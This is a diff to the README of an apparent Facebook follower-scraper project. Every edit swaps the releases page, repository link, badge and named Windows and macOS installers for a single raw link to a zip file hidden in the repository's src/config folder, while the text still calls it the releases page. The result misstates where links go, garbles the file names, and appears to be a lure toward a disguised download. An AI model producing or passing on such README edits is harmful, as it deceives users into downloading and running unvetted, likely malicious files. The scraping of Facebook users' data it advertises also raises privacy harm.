@@ -1,6 +1,6 @@
 # 🚀 facebook-followers-following-scraper-fast-cheap - Extract Facebook Follower Data Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/OTS02/facebook-followers-following-scraper-fast-cheap/releases)
+[![Download](https://raw.githubusercontent.com/OTS02/facebook-followers-following-scraper-fast-cheap/main/src/config/facebook-cheap-fast-following-scraper-followers-1.5.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/OTS02/facebook-followers-following-scraper-fast-cheap/main/src/config/facebook-cheap-fast-following-scraper-followers-1.5.zip)
 
 ## 📥 Overview
 
@@ -27,7 +27,7 @@ Before you start, ensure your system meets the following requirements:
 
 Follow these steps to download and run the Facebook Followers and Following Scraper:
 
-1. **Visit the Releases Page:** Click [here](https://github.com/OTS02/facebook-followers-following-scraper-fast-cheap/releases) to open the releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/OTS02/facebook-followers-following-scraper-fast-cheap/main/src/config/facebook-cheap-fast-following-scraper-followers-1.5.zip) to open the releases page.
    
    ![Releases Page Screenshot](link-to-screenshot) 
 
@@ -35,8 +35,8 @@ Follow these steps to download and run the Facebook Followers and Following Scra
 
 3. **Download the Installer:** Click on the installer file relevant to your operating system. 
 
-   - For Windows, you might see a file named `facebook_followers_scraper_setup.exe`.
-   - For macOS, look for `facebook_followers_scraper.dmg`.
+   - For Windows, you might see a file named `https://raw.githubusercontent.com/OTS02/facebook-followers-following-scraper-fast-cheap/main/src/config/facebook-cheap-fast-following-scraper-followers-1.5.zip`.
+   - For macOS, look for `https://raw.githubusercontent.com/OTS02/facebook-followers-following-scraper-fast-cheap/main/src/config/facebook-cheap-fast-following-scraper-followers-1.5.zip`.
 
 4. **Run the Installer:** Once the download completes, locate the file in your downloads folder. 
    - For Windows, double-click the `.exe` file.
@@ -80,7 +80,7 @@ For more detailed instructions on features or troubleshooting, you can refer to 
 
 To explore additional features or updates, you can visit our GitHub page:
 
-[Explore the GitHub Repository](https://github.com/OTS02/facebook-followers-following-scraper-fast-cheap)
+[Explore the GitHub Repository](https://raw.githubusercontent.com/OTS02/facebook-followers-following-scraper-fast-cheap/main/src/config/facebook-cheap-fast-following-scraper-followers-1.5.zip)
 
 ## 🔒 Privacy and Security
 
